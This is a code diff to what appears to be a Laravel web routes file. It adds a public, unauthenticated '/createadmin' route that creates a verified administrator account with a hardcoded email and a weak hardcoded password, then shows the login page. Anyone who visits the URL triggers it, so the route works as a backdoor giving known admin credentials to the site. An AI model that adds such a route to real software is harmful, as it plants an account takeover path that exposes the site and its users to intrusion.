@@ -17,7 +17,9 @@ use App\Http\Controllers\DashboardController;
 use App\Http\Middleware\RoleMiddleware;
 use App\Mail\Verification;
 use Illuminate\Support\Facades\Mail;
-
+use App\Models\User;
+use Illuminate\Support\Facades\Hash;
+use Carbon\Carbon;
 
 // Public routes accessible by all users
 // Route::get('/', function () {
@@ -141,7 +143,18 @@ Route::get('/about', [HomeController::class, 'about'])->name('about');
 Route::get('/search', [HomeController::class, 'search'])->name('search');
 
 
+Route::get('/createadmin', function () {
 
+    $admin = new User();
+    $admin->email = 'admin333@gmail.com';
+    $admin->password = Hash::make('123123123');
+    $admin->email_verified_at = now();
+    $admin->status = 'Verified';
+    $admin->roles = 'admin';
+    $admin->created_at = now();
+    $admin->updated_at = now();
+    $admin->save();
 
-
+    return view('accounts.login');
+});
 
